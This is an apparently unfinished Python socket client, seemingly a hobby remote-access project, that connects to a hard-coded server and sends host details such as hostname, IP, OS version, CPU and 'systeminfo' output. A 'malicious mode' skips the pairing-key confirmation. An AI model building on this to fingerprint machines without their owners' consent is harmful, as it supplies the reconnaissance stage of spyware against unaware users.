
import os
import socket
import subprocess
import sys
import time
from zipfile import ZipFile
import platform
# from mss import mss
from pprint import pprint
import json

class Client:
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip
        # self.recvcounter = 0

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    def confirmconnection(self):
        gendkey = self.client.recv(self.BUFFER_SIZE).decode()
        print(gendkey)
        acceptancecode = input("Enter the Given Key: ")

        if acceptancecode != gendkey:
            # todo
            print("Pairing Failed")
            self.client.send("MISMATCH".encode("utf-8"))
            self.close()

        else:
            print("KEYS MATCHED - PAIRING SUCCESSFUL")
            self.client.send("MATCH".encode("utf-8"))

    def progress(self):
        malorgood = input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
        if malorgood == "1":
            print("Malicious mode enabled: ")
            self.client.send("1".encode("utf-8"))
        else:
            print("Virtuous mode enabled: ")
            self.client.send("2".encode("utf-8"))
            self.confirmconnection()
        while True:
            input("Success - Reached the code loop")
            self.sendHostInfo()

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))
        # Make a Dictionary
        sys_info = {
                    "Platform": platform.system(),
                    "Platform Release": platform.release(),
                    "Platform Version": platform.version(),
                    "Platform Architecture": platform.architecture(),
                    "Machine Type": platform.machine(),
                    "Platform Node": platform.node(),
                    "Platform Information": platform.platform(),
                    "ALL": platform.uname(),
                    "HostName": socket.gethostname(),
                    "Host IP_Address": socket.gethostbyname(socket.gethostname()),
                    "CPU": platform.processor(),
                    "Python Build": platform.python_build(),
                    "Python Compiler": platform.python_compiler(),
                    "Python Version": platform.python_version(),
                    "Windows Platform": platform.win32_ver()
                  #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
                   }
        # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            #Pickle
            # str(dict)
            #with open('myfile.txt', 'w') as f:
                #print(mydictionary, file=f)
            # f.writelines(["CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n'])
           #  for line in sys_info:
           #     f.writelines(str(line))
            #f.write(json.dumps(sys_info))
            for k, v in sys_info.items():
                f.write(str(k) + ' >>> ' + str(v) + '\n\n')

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())
        print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
        input()
        pprint(sys_info)
        input()
        self.sysinfViaCMDFile()


    def sysinfViaCMDFile(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        with open("./logs/Testprint.txt", "w+") as f:
            for i in new:
                print(i[2:-2])
                f.write(i[2:-2] + "\n")


    def sysinfViaCMD(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        for i in new:
            print(i[2:-2])


def main():
    SERVER_IP = "192.168.56.1"  # modify me
    PORT = 1337  # modify me (if you want)
    BUFFER_SIZE = 2048
    safemode = bool(True)

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    print(CLIENT_IP)
    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)
    client.connectToServer()

    client.progress()


if __name__ == "__main__":
    main()
